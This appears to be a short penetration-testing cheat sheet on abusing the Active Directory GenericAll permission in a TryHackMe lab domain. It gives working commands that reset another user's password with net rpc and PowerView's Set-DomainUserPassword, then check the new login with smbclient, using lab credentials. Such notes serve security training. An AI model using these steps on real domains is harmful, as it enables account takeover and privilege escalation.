# GenericAll

The **GenericAll** permission is one of the most dangerous permissions, granting full control over an object. This includes resetting passwords, modifying attributes, and changing group memberships.

Reset password:

{% code overflow="wrap" %}
```sh
net rpc password "SHAWNA_BRAY" "newP@ssword2022" -U "thm.corp"/"TABATHA_BRITT"%"marlboro(1985)" -S "10.10.224.165" 
```
{% endcode %}

Verify creds:

{% code overflow="wrap" %}
```sh
smbclient //10.10.224.165/Data -U 'thm.corp/SHAWNA_BRAY%newP@ssword2022'
```
{% endcode %}



To abuse this permission with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller asCRUZ\_HALL@THM.CORP if you are not running a process as that user. To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)

Then create a secure string object for the password you want to set on the target user:

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as CRUZ\_HALL@THM.CORP:

Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred
